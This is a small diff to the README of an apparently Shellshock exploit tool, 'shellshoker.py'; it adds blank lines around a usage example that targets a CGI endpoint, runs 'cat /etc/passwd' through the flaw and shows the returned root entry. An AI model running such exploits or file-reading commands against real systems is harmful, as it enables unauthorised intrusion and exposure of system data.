@@ -14,7 +14,9 @@ Using:
   3. Read the output :)
 
 Example:
+
 python shellshoker.py http://10.0.0.12:591/cgi-bin/cat
+
 Shellshock Command: cat /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
